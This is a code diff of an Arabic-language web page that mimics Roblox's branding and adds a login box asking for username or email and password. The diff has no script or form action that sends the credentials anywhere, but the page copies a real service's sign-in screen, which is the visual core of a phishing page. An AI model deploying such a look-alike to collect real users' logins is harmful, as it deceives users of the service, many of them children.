@@ -8,12 +8,11 @@
 body{
   margin:0;
   font-family:Arial, sans-serif;
+  background:#1c1f26;
   color:white;
-  background:url("IMG_0161.png") no-repeat center center fixed;
-  background-size:cover;
 }
 
-/* Navbar */
+/* الشريط */
 .navbar{
   background:linear-gradient(#1a1a1a,#0f0f0f);
   height:64px;
@@ -32,49 +31,101 @@ body{
   display:flex;
   gap:18px;
 }
-
 .links a{
-  color:white;
+  color:#ddd;
   text-decoration:none;
   font-size:14px;
 }
+.links a:hover{color:white}
 
+/* البحث */
 .search{
-  margin-left:auto;
-  margin-right:15px;
-}
-
-.search input{
-  background:#111;
-  border:1px solid #333;
-  color:white;
+  margin:auto;
+  display:flex;
+  align-items:center;
+  background:#222;
+  border-radius:8px;
   padding:6px 12px;
-  border-radius:6px;
 }
-
-.btn{
-  background:#2f6bff;
-  color:white;
+.search input{
+  background:transparent;
   border:none;
-  padding:7px 14px;
-  border-radius:6px;
-  cursor:pointer;
+  color:white;
+  outline:none;
+  width:260px;
 }
 
-.btn.white{
-  background:#1f1f1f;
-  border:1px solid #555;
+/* الأزرار */
+.actions{
+  display:flex;
+  gap:10px;
 }
+.btn-blue{
+  background:#2a7cff;
+  border:none;
+  color:white;
+  padding:8px 14px;
+  border-radius:8px;
+}
+.btn-dark{
+  background:#111;
+  border:1px solid #555;
+  color:white;
+  padding:8px 14px;
+  border-radius:8px;
+}
+
+/* الصندوق */
+.main{
+  display:flex;
+  justify-content:center;
+  margin-top:70px;
+}
+.box{
+  background:#23262f;
+  width:380px;
+  padding:25px;
+  border-radius:12px;
+}
+.box h2{text-align:center;}
+.box input{
+  width:100%;
+  padding:12px;
+  margin:10px 0;
+  border:none;
+  border-radius:8px;
+  background:#2f3340;
+  color:white;
+}
+.mainbtn{
+  width:100%;
+  padding:12px;
+  background:#2a7cff;
+  border:none;
+  border-radius:8px;
+  color:white;
+  font-weight:bold;
+}
+.sec{
+  width:100%;
+  padding:12px;
+  background:#2f3340;
+  border:none;
+  border-radius:8px;
+  color:white;
+  margin-top:10px;
+}
+.small{text-align:center;font-size:13px;color:#ccc;margin:12px 0;}
+.line{height:1px;background:#444;margin:15px 0;}
 </style>
 </head>
-
 <body>
 
 <div class="navbar">
   <div class="logo">ROBLOX</div>
 
   <div class="links">
-    <a href="#">الرائجة</a>
+    <a href="#">الرئيسية</a>
     <a href="#">السوق</a>
     <a href="#">إنشاء</a>
     <a href="#">Robux</a>
@@ -84,8 +135,29 @@ body{
     <input type="text" placeholder="بحث">
   </div>
 
-  <button class="btn">تسجيل الدخول</button>
-  <button class="btn white">تسجيل الدخول</button>
+  <div class="actions">
+    <button class="btn-blue">تسجيل الدخول</button>
+    <button class="btn-dark">تسجيل الدخول</button>
+  </div>
+</div>
+
+<div class="main">
+<div class="box">
+  <h2>تسجيل الدخول إلى Roblox</h2>
+
+  <input type="text" placeholder="اسم المستخدم / البريد الإلكتروني">
+  <input type="password" placeholder="كلمة المرور">
+
+  <button class="mainbtn">تسجيل الدخول</button>
+
+  <div class="small">نسيت كلمة المرور أو اسم المستخدم؟</div>
+  <div class="line"></div>
+
+  <button class="sec">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</button>
+  <button class="sec">تسجيل دخول سريع</button>
+
+  <div class="small">ليس لديك حساب؟ اشترك</div>
+</div>
 </div>
 
 </body>
